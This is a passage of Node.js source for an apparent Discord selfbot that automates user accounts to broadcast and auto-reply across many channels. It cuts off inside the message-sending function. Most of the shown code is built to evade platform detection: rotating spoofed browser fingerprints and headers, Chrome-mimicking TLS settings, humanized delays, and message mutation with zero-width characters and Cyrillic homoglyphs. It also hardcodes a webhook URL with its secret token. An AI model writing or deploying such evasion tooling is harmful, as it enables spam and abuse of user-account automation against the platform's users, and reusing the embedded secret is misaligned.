const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');
const nacl = require('tweetnacl');
const pako = require('pako');
const { spawn } = require('child_process');
const https = require('https');
const WebSocket = require('ws');
const { Client: SelfbotClient13, AttachmentBuilder } = require('@discord-selfbot-sdk/bot');

// ═══════════════════════════════════════════════════════════════════════════════
// FIX: @discord-selfbot-sdk/bot crashes in THREAD_LIST_SYNC handler when
// Discord sends null/undefined for threads/members. Defensive monkey-patch.
// ═══════════════════════════════════════════════════════════════════════════════
const _origObjectValues = Object.values;
Object.values = function(obj) {
  if (obj === null || obj === undefined) return [];
  return _origObjectValues.call(this, obj);
};

// ═══════════════════════════════════════════════════════════════════════════════
// ENVIRONMENT SETUP
// ═══════════════════════════════════════════════════════════════════════════════
require('dotenv').config();

const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

// ═══════════════════════════════════════════════════════════════════════════════
// TOKEN UTILITIES — Auto-detect bot vs user token
// ═══════════════════════════════════════════════════════════════════════════════

async function validateTokenFormat(token) {
  try {
    const res = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Discord-Locale': 'en-US',
        'Referer': 'https://discord.com/channels/@me'
      },
      timeout: 10000,
      validateStatus: () => true
    });
    if (res.status === 200 && res.data && res.data.id) {
      return { valid: true, type: 'user', user: res.data, prefix: '' };
    }
    if (res.status === 401 || res.status === 403) {
      return { valid: false, type: null, user: null, prefix: null };
    }
  } catch(e) {}

  return { valid: false, type: null, user: null, prefix: null };
}

// ═══════════════════════════════════════════════════════════════════════════════
// HUMANIZED DELAY UTILITIES
// ═══════════════════════════════════════════════════════════════════════════════

function randomBetween(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function jitterDelay(baseMs, jitterPercent = 0.25) {
  const jitter = baseMs * jitterPercent * (Math.random() * 2 - 1);
  return Math.max(0, Math.floor(baseMs + jitter));
}

/**
 * Humanize a base delay by adding natural variation.
 * Returns a value between baseMs * (1 - humanization) and baseMs * (1 + humanization),
 * but never less than minPercent of baseMs.
 */
function humanizeDelay(baseMs, humanization = 0.30, minPercent = 0.4) {
  const jitter = baseMs * humanization * (Math.random() * 2 - 1);
  return Math.max(Math.floor(baseMs * minPercent), Math.floor(baseMs + jitter));
}

/**
 * Simulate human typing time based on message length.
 * Average person types ~200-300 chars per minute = ~3-5 chars per second.
 */
function typingTimeForMessage(text) {
  const charCount = (text || '').length;
  if (charCount === 0) return randomBetween(800, 2000);
  // ~40-80ms per character = ~15-25 chars/sec (faster than real but feels right)
  const baseTime = charCount * randomBetween(40, 80);
  // Cap at 8 seconds for very long messages
  return Math.min(baseTime, 8000);
}

// ═══════════════════════════════════════════════════════════════════════════════
// MESSAGE VARIATION ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

const SPINTAX_RE = /\{([^}]+)\}/g;

function expandSpintax(text) {
  if (!text || !SPINTAX_RE.test(text)) return text;
  SPINTAX_RE.lastIndex = 0;
  let iterations = 0;
  let result = text;
  while (SPINTAX_RE.test(result) && iterations < 50) {
    SPINTAX_RE.lastIndex = 0;
    result = result.replace(SPINTAX_RE, (_, choices) => {
      const opts = choices.split('|').map(s => s.trim()).filter(Boolean);
      return opts.length > 0 ? opts[Math.floor(Math.random() * opts.length)] : '';
    });
    iterations++;
  }
  return result;
}

function mutateMessage(text) {
  if (!text) return text;
  const mutators = [
    (s) => Math.random() < 0.25 ? s + (Math.random() < 0.5 ? ' ' : '') : s,
    (s) => Math.random() < 0.15 ? s.replace(/ /g, () => Math.random() < 0.05 ? '\u200B ' : ' ') : s,
    (s) => Math.random() < 0.1 ? s.replace(/o/g, () => Math.random() < 0.03 ? '\u043E' : 'o') : s,
    (s) => Math.random() < 0.08 ? s[0].toLowerCase() + s.slice(1) : s,
  ];
  let result = text;
  const count = Math.floor(Math.random() * 3);
  const shuffled = mutators.sort(() => Math.random() - 0.5);
  for (let i = 0; i < count; i++) {
    result = shuffled[i](result);
  }
  return result;
}

function varyMessage(text) {
  const expanded = expandSpintax(text);
  return mutateMessage(expanded);
}

function weightedRandom(items, weights) {
  const w = weights || items.map(() => 1);
  const total = w.reduce((a, b) => a + b, 0);
  let r = Math.random() * total;
  for (let i = 0; i < items.length; i++) {
    r -= w[i];
    if (r <= 0) return items[i];
  }
  return items[items.length - 1];
}

// ═══════════════════════════════════════════════════════════════════════════════
// ACCOUNT FINGERPRINTING
// ═══════════════════════════════════════════════════════════════════════════════

const _accountProfiles = new Map();
const _sharedChannelRateLimits = new Map();   // tokenHash -> Map(channelId -> freeAt)
const _sharedChannelPermissions = new Map();  // tokenHash -> Map(channelId -> boolean)
const _sharedGlobalRateLimits = new Map();    // tokenHash -> resetTimestamp

function _getAccountProfile(token) {
  const hash = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
  if (!_accountProfiles.has(hash)) {
    const screens = [[1366,768],[1440,900],[1536,864],[1600,900],[1920,1080],[1920,1200],[2560,1440]];
    const screen = screens[Math.floor(Math.random() * screens.length)];
    const mems = [2,4,8,16];
    const concurrencies = [2,4,8,16];
    const browsers = [
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '135.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '134.0.0.0' },
      { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', osv: '10.15.7', bv: '135.0.0.0' },
      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0', browser: 'Firefox', os: 'Windows', osv: '10', bv: '135.0' },
      { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1', browser: 'Mobile Safari', os: 'iOS', osv: '18.1', bv: '18.1' },
      { ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36', browser: 'Chrome', os: 'Android', osv: '15', bv: '135.0.0.0' },
    ];
    const b = browsers[Math.floor(Math.random() * browsers.length)];
    _accountProfiles.set(hash, {
      ua: b.ua, browser: b.browser, os: b.os, osv: b.osv, bv: b.bv,
      sw: screen[0], sh: screen[1], dpr: [1,1.25,1.5,2][Math.floor(Math.random() * 4)],
      cd: 24, mem: mems[Math.floor(Math.random() * mems.length)],
      hw: concurrencies[Math.floor(Math.random() * concurrencies.length)],
      arch: 'x64', build: 438286,
      locale: ['en-US','en-GB','en-CA'][Math.floor(Math.random() * 3)],
    });
  }
  return _accountProfiles.get(hash);
}

const _fp = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0'
];
const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Math.random() * _fp.length)];

function generateXSuperProperties(token) {
  const p = _getAccountProfile(token);
  const props = {
    os: p.os, browser: p.browser, device: '', system_locale: p.locale,
    browser_user_agent: p.ua, browser_version: p.bv, os_version: p.osv,
    referrer: '', referring_domain: '', referrer_current: '', referring_domain_current: '',
    release_channel: 'stable', client_build_number: p.build, client_event_source: null, design_id: 0,
  };
  return Buffer.from(JSON.stringify(props)).toString('base64');
}

// ═══════════════════════════════════════════════════════════════════════════════
// TLS & NETWORK CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════════

function getChromeTLSOptions(isWS = false) {
  return {
    ciphers: [
      'TLS_AES_128_GCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_CHACHA20_POLY1305_SHA256',
      'ECDHE-ECDSA-AES128-GCM-SHA256','ECDHE-RSA-AES128-GCM-SHA256',
      'ECDHE-ECDSA-AES256-GCM-SHA384','ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-CHACHA20-POLY1305','ECDHE-RSA-CHACHA20-POLY1305',
      'ECDHE-RSA-AES128-SHA','ECDHE-RSA-AES256-SHA',
      'AES128-GCM-SHA256','AES256-GCM-SHA384','AES128-SHA','AES256-SHA',
    ].join(':'),
    minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
    ALPNProtocols: ['http/1.1'],
    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    ecdhCurve: 'X25519:P-256:P-384',
    honorCipherOrder: false,
  };
}

function createSharedAgent(isWS = false) {
  return new https.Agent({
    ...getChromeTLSOptions(isWS),
    keepAlive: true, keepAliveMsecs: 30000,
    maxSockets: 6, maxFreeSockets: 3,
    scheduling: 'lifo', timeout: 30000,
  });
}

const _sharedAgent = createSharedAgent(false);

const _axiosInstance = axios.create({
  timeout: 15000,
  headers: { 'Connection': 'keep-alive' },
  httpsAgent: _sharedAgent,
  validateStatus: () => true,
});

const { createHash } = crypto;

function getKeypair(token) {
  const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
  return nacl.sign.keyPair.fromSeed(Uint8Array.from(seed));
}

function signPayload(payload, secretKey) {
  const message = Buffer.from(JSON.stringify(payload));
  return Buffer.from(nacl.sign.detached(Uint8Array.from(message), secretKey));
}

function encryptSecretBox(message, key) {
  const nonce = nacl.randomBytes(24);
  const msgBytes = message instanceof Buffer ? new Uint8Array(message) : new Uint8Array(Buffer.from(message, 'utf8'));
  const keyBytes = key instanceof Buffer ? new Uint8Array(key) : new Uint8Array(key);
  const box = nacl.secretbox(msgBytes, nonce, keyBytes);
  return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
}

function decryptSecretBox(nonce, ciphertext, key) {
  const opened = nacl.secretbox.open(
    ciphertext instanceof Uint8Array ? ciphertext : new Uint8Array(ciphertext),
    nonce instanceof Uint8Array ? nonce : new Uint8Array(nonce),
    key instanceof Uint8Array ? key : new Uint8Array(key)
  );
  return opened ? Buffer.from(opened) : null;
}

function generateKey() {
  return Buffer.from(nacl.randomBytes(32));
}

function compressData(data, level = 6) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.deflate(input, { level }));
}

function decompressData(data) {
  const input = data instanceof Buffer ? new Uint8Array(data) : data;
  return Buffer.from(pako.inflate(input));
}

function isCompressed(data) {
  if (!data || data.length < 2) return false;
  return (data[0] === 0x78 && (data[1] === 0x9C || data[1] === 0xDA || data[1] === 0x01));
}

// ═══════════════════════════════════════════════════════════════════════════════
// DISCORD API CLIENT — Rate-limited REST client with proper RL headers
// ═══════════════════════════════════════════════════════════════════════════════

class DiscordApiClient {
  constructor(token) {
    this.token = token;
    this.tokenType = 'user';
    this.authHeader = token;
    this.fp = _rfp(token);
    this.superProps = generateXSuperProperties(token);
    this.keypair = getKeypair(token);
    this._tokenHash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
    if (!_sharedGlobalRateLimits.has(this._tokenHash)) _sharedGlobalRateLimits.set(this._tokenHash, 0);
    this._rotationTimer = setInterval(() => this.rotateFingerprint(), (20 * 60 * 1000) + Math.floor(Math.random() * 10 * 60 * 1000));
  }

  rotateFingerprint() {
    if (Math.random() < 0.15) {
      const hash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
      _accountProfiles.delete(hash);
    }
    this.fp = _rfp(this.token);
    this.superProps = generateXSuperProperties(this.token);
  }

  _headers(extra = {}) {
    const base = {
      'Authorization': this.authHeader,
      'User-Agent': this.fp,
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'X-Discord-Locale': 'en-US',
      'X-Super-Properties': this.superProps,
      'Referer': 'https://discord.com/channels/@me',
    };
    const ordered = {};
    const order = ['Authorization','User-Agent','Accept','Accept-Language','X-Discord-Locale','X-Super-Properties','Referer'];
    for (const k of order) if (base[k] !== undefined) ordered[k] = base[k];
    for (const [k, v] of Object.entries(extra)) ordered[k] = v;
    return ordered;
  }

  async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
    const url = `https://discord.com/api/v10${endpoint}`;
    let attempts = 0;
    const maxAttempts = 3;

    while (attempts < maxAttempts) {
      const globalWait = (_sharedGlobalRateLimits.get(this._tokenHash) || 0) - Date.now();
      if (globalWait > 0) {
        await new Promise(r => setTimeout(r, globalWait));
      }

      try {
        const config = {
          method: method.toUpperCase(),
          url: url,
          headers: this._headers(extraHeaders),
          timeout: 20000,
          responseType: 'arraybuffer',
        };
        if (body !== null) {
          config.data = body;
          if (!(body instanceof Buffer) && typeof body === 'object' && !extraHeaders['Content-Type']) {
            config.headers['Content-Type'] = 'application/json';
          }
        }
        const res = await _axiosInstance(config);
        const status = res.status;
        const responseBody = Buffer.from(res.data);
        let parsedData = null;
        try { parsedData = JSON.parse(responseBody.toString()); } catch(e) {}

        // ── Parse rate limit headers from successful responses ──
        if (status !== 429) {
          const remaining = parseInt(res.headers['x-ratelimit-remaining'] || '1', 10);
          const resetAfter = parseFloat(res.headers['x-ratelimit-reset-after'] || '0');
          if (remaining === 0 && resetAfter > 0) {
            const bufferMs = jitterDelay(500, 0.3); // 350-650ms buffer
            _sharedGlobalRateLimits.set(this._tokenHash, Date.now() + (resetAfter * 1000) + bufferMs);
          }
        }

        if (status === 429) {
          const isGlobal = res.headers['x-ratelimit-global'] === 'true';
          // FIX: Cap retry-after at 60 seconds to prevent 10+ minute waits
          const rawRetryAfter = parseFloat(res.headers['retry-after'] || 5);
          const retryAfter = Math.min(rawRetryAfter, 60); // CAP AT 60s
          const retryAfterMs = retryAfter < 1000 ? retryAfter * 1000 : retryAfter;
          if (isGlobal) _sharedGlobalRateLimits.set(this._tokenHash, Date.now() + retryAfterMs);
          // Exponential backoff: base retry + attempt multiplier
          const backoffMs = retryAfterMs * (1 + attempts * 0.5);
          await new Promise(r => setTimeout(r, backoffMs));
          attempts++;
          continue;
        }
        if (status >= 400) {
          const err = new Error(`Discord API ${method} ${endpoint} failed: ${status}`);
          err.status = status;
          err.data = parsedData;
          throw err;
        }
        return parsedData;
      } catch (err) {
        if (err.status && err.data) throw err;
        if (attempts < maxAttempts - 1) {
          await new Promise(r => setTimeout(r, 2000 * (attempts + 1)));
          attempts++;
          continue;
        }
        throw err;
      }
    }
    throw new Error(`Discord API ${method} ${endpoint} failed: 429 after ${maxAttempts} retries`);
  }

  destroy() {
    if (this._rotationTimer) clearInterval(this._rotationTimer);
  }
}

const OWNER_ID = process.env.OWNER_ID || '1482736115143282941';
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';


// ═══════════════════════════════════════════════════════════════════════════════
// STEALTH CLIENT — Raw WebSocket gateway connection
// ═══════════════════════════════════════════════════════════════════════════════

// Rate limit constants — FIXED: Reduced to prevent compounding delays
// ═══════════════════════════════════════════════════════════════════════════════
//
// BEFORE (causing 10-11 min delays):
//   - RL_MIN_CHANNEL_DELAY = 800ms  → too high, compounds per-message
//   - RL_MAX_CHANNEL_DELAY = 2500ms → cap too high
//   - RL_PER_CHANNEL_JITTER = 0.35  → too much variation
//   - RL_INTER_CHANNEL_STAGGER = 350ms → too high per-channel
//   - Queue drain stagger = 400ms ±40% → adds up fast
//   - _getNextChannelFreeTime compounds: max(now, currentFree) + jitter
//
// AFTER (target ~30s actual delay):
//   - RL_MIN_CHANNEL_DELAY = 400ms  → half the base
//   - RL_MAX_CHANNEL_DELAY = 1200ms → lower cap
//   - RL_PER_CHANNEL_JITTER = 0.20  → less variation
//   - RL_INTER_CHANNEL_STAGGER = 100ms → minimal stagger
//   - Queue drain stagger = 200ms ±20% → faster
//   - _getNextChannelFreeTime uses NOW as base (no compounding)
//
// THE MATH: 10 channels x 2 messages x ~600ms avg + 9 x 100ms stagger
//           = ~12,000ms + 900ms = ~13s per round
//           With 30s delay: 30s - 13s = ~17s actual wait
// ═══════════════════════════════════════════════════════════════════════════════
const RL_MIN_CHANNEL_DELAY = 400;       // was 800 — halved
const RL_MAX_CHANNEL_DELAY = 1200;      // was 2500 — halved
const RL_PER_CHANNEL_JITTER = 0.20;     // was 0.35 — reduced
const RL_429_BACKOFF_BASE = 5000;       // 5s base on first 429
const RL_429_BACKOFF_MAX = 30000;       // 30s cap
const RL_429_RETRY_CAP_SEC = 60;        // Cap Discord retry-after at 60s
const RL_MAX_WAIT_BEFORE_SKIP = 8000;   // If we need to wait >8s, skip
const RL_INTER_CHANNEL_STAGGER = 100;   // was 350 — minimal stagger
const RL_QUEUE_DRAIN_BASE = 200;        // was 400 — faster queue drain
const RL_QUEUE_DRAIN_JITTER = 0.20;     // was 0.40 — less variation

class StealthClient {
  constructor(token) {
    this.token = token;
    this.tokenType = null;
    this.authPrefix = '';
    this.ws = null;
    this._heartbeatInterval = null;
    this.api = null;
    this.repliedUsers = this._loadRepliedUsers();
    this.encryptionKey = null;
    this.ready = false;
    this.handlers = {};
    this._dmCooldowns = new Map();
    // ═══════════════════════════════════════════════════════════════════════════
    // FIX: Rate limit tracking — separated into two Maps to prevent
    // compounding between normal spacing and 429 backoffs.
    // ═══════════════════════════════════════════════════════════════════════════
    this._channelRateLimits = new Map();    // channelId -> nextFreeAt (normal spacing)
    this._channel429Backoffs = new Map();   // channelId -> backoffUntil (429 only)
    // NEW: per-channel send queues to prevent concurrent floods
    this._channelSendQueues = new Map();    // channelId -> { running: bool, queue: [] }
    const tokenHash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
    if (!_sharedChannelPermissions.has(tokenHash)) _sharedChannelPermissions.set(tokenHash, new Map());
    this._channelPermissions = _sharedChannelPermissions.get(tokenHash);
    this._explicitlyStopped = false;
    this._currentChannelId = null;
    this._backgroundTimers = [];
    this._tokenValidated = false;
    this._tokenValid = false;
    this._validatedUser = null;
    this.pendingReplies = new Set();
    this._autoReplyState = new Map();
    this.user = null;
    this.selfbot = new SelfbotClient13({ checkUpdate: false });
    this._selfbotReady = false;
  }

  _loadRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      if (fs.existsSync(f)) return new Set(JSON.parse(fs.readFileSync(f, 'utf8')));
    } catch(e) {}
    return new Set();
  }

  _saveRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      fs.writeFileSync(f, JSON.stringify([...this.repliedUsers]));
    } catch(e) {}
  }

  async _validateTokenWithCache() {
    if (this._tokenValidated) return { valid: this._tokenValid, user: this._validatedUser };
    const result = await validateTokenFormat(this.token);
    if (result.valid) {
      this._tokenValid = true; this._validatedUser = result.user;
      this.tokenType = result.type; this.authPrefix = result.prefix; this._tokenValidated = true;
      return { valid: true, user: result.user, type: result.type };
    }
    const retry = await validateTokenFormat(this.token);
    if (retry.valid) {
      this._tokenValid = true; this._validatedUser = retry.user;
      this.tokenType = retry.type; this.authPrefix = retry.prefix; this._tokenValidated = true;
      return { valid: true, user: retry.user, type: retry.type };
    }
    this._tokenValid = false; this._tokenValidated = true;
    return { valid: false, user: null };
  }

  _cleanupWS() {
    try {
      if (this.ws) {
        this.ws.removeAllListeners();
        this.ws.terminate();
        this.ws = null;
      }
    } catch(e) {}
    if (this._heartbeatInterval) {
      clearInterval(this._heartbeatInterval);
      this._heartbeatInterval = null;
    }
  }

  async connect() {
    this._explicitlyStopped = false;
    const validation = await this._validateTokenWithCache();
    if (!validation.valid) throw new Error('Invalid token - check your token and try again');

    this.user = validation.user;
    this.tokenType = 'user';
    this.authPrefix = '';
    this.api = new DiscordApiClient(this.token);

    // Login @discord-selfbot-sdk/bot for reliable message sending
    try {
      this.selfbot.token = this.token;
      this.selfbot.once('ready', () => { this._selfbotReady = true; });
      this.selfbot.login(this.token).catch(() => {});
    } catch (e) {}

    return new Promise((resolve, reject) => {
      const CONNECT_TIMEOUT = 60000;
      let resolved = false;
      let timeoutTimer = setTimeout(() => {
        this._explicitlyStopped = true;
        this._cleanupWS();
        reject(new Error('Connection timed out - please try again'));
      }, CONNECT_TIMEOUT);

      const connectGateway = () => {
        try {
          if (this.ws) { this.ws.terminate(); this.ws = null; }
        } catch(e) {}

        const wsUrl = 'wss://gateway.discord.gg/?v=10&encoding=json';
        const wsOptions = {
          headers: {
            'User-Agent': this.api ? this.api.fp : _rfp(this.token),
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Discord-Locale': 'en-US'
          },
          agent: createSharedAgent(true)
        };

        this.ws = new WebSocket(wsUrl, wsOptions);

        this.ws.on('message', (data) => {
          try {
            const payload = JSON.parse(data.toString());

            if (payload.op === 10) { // Hello
              const interval = payload.d.heartbeat_interval;

              let props = {};
              try {
                if (this.api && this.api.superProps) {
                  props = JSON.parse(Buffer.from(this.api.superProps, 'base64').toString());
                }
              } catch(e) {
                props = {
                  os: 'Windows', browser: 'Chrome', device: '', system_locale: 'en-US',
                  browser_user_agent: _rfp(this.token), browser_version: '135.0.0.0',
                  os_version: '10', referrer: '', referring_domain: '',
                  referrer_current: '', referring_domain_current: '',
                  release_channel: 'stable', client_build_number: 438286,
                  client_event_source: null, design_id: 0
                };
              }

              // FIX: Removed hardcoded "vanitys always" custom status.
              // Now sends empty activities so no custom status is forced on users.
              this.ws.send(JSON.stringify({
                op: 2,
                d: {
                  token: this.token,
                  capabilities: 30717,
                  properties: props,
                  presence: {
                    status: 'online',
                    since: 0,
                    activities: [],  // FIX: No custom status forced
                    afk: false,
                    broadcast: null
                  },
                  compress: false,
                  client_state: {
                    guild_versions: {},
                    highest_last_message_id: '0',
                    read_state_version: 0,
                    user_guild_settings_version: -1,
                    user_settings_version: -1,
                    private_channels_version: '0',
                    api_code_version: 0
                  }
                }
              }));

              if (this._heartbeatInterval) {
                clearInterval(this._heartbeatInterval);
                this._heartbeatInterval = null;
              }

              this._heartbeatInterval = setInterval(() => {
                if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                  this.ws.send(JSON.stringify({ op: 1, d: this.sequence || null }));
                }
              }, interval);
            }

            if (payload.op === 0 && payload.t === 'READY') {
              this.ready = true;
              clearTimeout(timeoutTimer);
              timeoutTimer = null;
              this.user = this.user || {
                id: payload.d.user.id,
                username: payload.d.user.username,
                discriminator: payload.d.user.discriminator,
                avatar: payload.d.user.avatar,
                bot: false
              };
              this.emit('READY', { user: payload.d.user });
              this._startBackgroundEvents();
              // Auto-fetch full server list + invites
              this.fetchGuilds().catch(() => {});
              if (!resolved) {
                resolved = true;
                resolve();
              }
            }

            if (payload.op === 0 && payload.t === 'MESSAGE_CREATE') {
              if (this.ready && !this._explicitlyStopped) {
                const normalized = this._normalizeGatewayMessage(payload.d);
                this.emit('messageCreate', normalized);
              }
            }

            if (payload.op === 1) {
              if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                this.ws.send(JSON.stringify({ op: 1, d: this.sequence || null }));
              }
            }

            if (payload.s !== undefined && payload.s !== null) {
              this.sequence = payload.s;
            }
          } catch (parseErr) {
            console.error('[WS] Message parse error:', parseErr.message);
          }
        });

        this.ws.on('close', (code, reason) => {
          if (this._heartbeatInterval) {
            clearInterval(this._heartbeatInterval);
            this._heartbeatInterval = null;
          }
          this.ready = false;
          if (!this._explicitlyStopped) {
            console.log(`[WS] Connection closed (${code}), reconnecting in 5s...`);
            setTimeout(() => {
              if (!this._explicitlyStopped) connectGateway();
            }, 5000);
          }
        });

        this.ws.on('error', (err) => {
          console.error('[WS] Client error:', err.message);
        });
      };

      connectGateway();
    });
  }

  _normalizeGatewayMessage(d) {
    const ts = d.timestamp ? new Date(d.timestamp).getTime() : Date.now();
    const self = this;
    return {
      id: d.id,
      content: d.content || '',
      author: {
        id: d.author?.id,
        username: d.author?.username,
        discriminator: d.author?.discriminator,
        bot: d.author?.bot || false
      },
      channelId: d.channel_id,
      guildId: d.guild_id || null,
      createdTimestamp: ts,
      channel: d.channel_id ? {
        id: d.channel_id,
        send: async (content) => {
          return self.sendMessage(d.channel_id, content);
        }
      } : null,
      reply: async (content) => {
        return self.sendMessage(d.channel_id, content);
      }
    };
  }

  _startBackgroundEvents() {
    this._stopBackgroundEvents();
    // Background events stripped to avoid rate-limit consumption and blocking
  }

  _stopBackgroundEvents() {
    for (const timer of this._backgroundTimers) clearTimeout(timer);
    this._backgroundTimers = [];
  }

  async checkChannelPermission(channelId) {
    if (this._channelPermissions.has(channelId)) return this._channelPermissions.get(channelId);
    try {
      const channel = await this.api.request(`/channels/${channelId}`, 'GET');
      if (!channel || !channel.id) {
        this._channelPermissions.set(channelId, false);
        return false;
      }
      this._channelPermissions.set(channelId, true);
      return true;
    } catch (err) {
      const discordCode = err.data?.code || err.code;
      if (err.status === 403 || err.status === 401 || err.status === 404 || discordCode === 10003 || discordCode === 50001 || discordCode === 50013) {
        this._channelPermissions.set(channelId, false);
        return false;
      }
      console.error(`[ChannelCheck] Transient error for ${channelId}:`, err.message);
      return null;
    }
  }

  async navigateToChannel(channelId) {
    this._currentChannelId = channelId;
  }

  async sendTyping(channelId) {
    try {
      await this.api.request(`/channels/${channelId}/typing`, 'POST');
    } catch (e) {
      // Typing indicator is cosmetic; ignore failures
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // FIX #1 + #2: Rewrote _getNextChannelFreeTime to prevent compounding.
  //
  // OLD (broken — compounds into 10+ min):
  //   return Math.max(now, currentFree) + clampedJitter;
  //   // Each send added ~800ms on top of previous → 5 msgs = 5x compounding
  //
  // NEW (fixed — uses NOW as base, no compounding):
  //   - Normal case: return now + jitter (resets each time)
  //   - If a 429 backoff is active (>now+5s): honor it but don't compound
  //   - If currentFree is absurdly far (>now+10s): reset to now
  //
  // This prevents the snowball where each round gets slower than the last.
  // ═══════════════════════════════════════════════════════════════════════════
  _getNextChannelFreeTime(channelId, baseDelayMs = RL_MIN_CHANNEL_DELAY) {
    const now = Date.now();
    const currentFree = this._channelRateLimits.get(channelId) || 0;
    const jittered = jitterDelay(baseDelayMs, RL_PER_CHANNEL_JITTER);
    const clampedJitter = Math.min(jittered, RL_MAX_CHANNEL_DELAY);

    // Safety: if rate limit is absurdly far in the future (>10s), something
    // went wrong — reset it to now to prevent infinite compounding.
    if (currentFree > now + 10000) {
      return now + clampedJitter;
    }

    // FIX: Don't compound on top of currentFree. Always use now as the base.
    // The old code did: Math.max(now, currentFree) + clampedJitter
    // which added delay ON TOP OF existing future rate limits.
    //
    // New logic: if currentFree is from a real 429 backoff (>5s ahead),
    // wait for it to clear, then add a small jitter. Otherwise just
    // space from now to prevent compounding across messages.
    if (currentFree > now + 5000) {
      // This looks like a 429 backoff, not normal spacing. Honor it.
      return currentFree + clampedJitter;
    }

    // Normal case: don't compound. Space from now.
    return now + clampedJitter;
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // FIX #4: Strong reset mechanism. Call this after each broadcast round
  // to clear compounding rate limits before the next round starts.
  // Only preserves 429 backoffs (values > now + 5s) since those are real.
  // ═══════════════════════════════════════════════════════════════════════════
  resetChannelRateLimitsForNextRound() {
    const now = Date.now();
    let resetCount = 0;
    for (const [channelId, freeAt] of this._channelRateLimits.entries()) {
      // Only preserve actual 429 backoffs (far in future). Clear everything else.
      if (freeAt < now + 5000) {
        this._channelRateLimits.set(channelId, now);
        resetCount++;
      }
    }
    if (resetCount > 0) {
      console.log(`[RateLimit] Reset ${resetCount} channel rate limits for next round`);
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // FIX #1: Removed redundant rate-limit wait from sendMessage.
  //
  // OLD (double-waiting — adds compounding):
  //   sendMessage() {
  //     const freeAt = this._getNextChannelFreeTime(channelId);  // WAIT #1
  //     await sleep(wait);
  //     return sendMessageDirect(...);  // has its own _channelRateLimits check (WAIT #2)
  //   }
  //
  // NEW (single wait — sendMessageDirect already handles rate limits):
  //   sendMessage() {
  //     return sendMessageDirect(...);  // Only wait is inside here
  //   }
  //
  // sendMessageDirect already checks _channelRateLimits and waits if needed.
  // The extra _getNextChannelFreeTime wait in sendMessage was redundant AND
  // it was the source of compounding because it used _getNextChannelFreeTime
  // which kept pushing the limit forward.
  // ═══════════════════════════════════════════════════════════════════════════
  async sendMessage(channelId, content, attachments = []) {
    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) {
      console.error(`[SendMessage] Blocked: channel ${channelId} cached as no permission`);
      return false;
    }
    const variedContent = varyMessage(content);
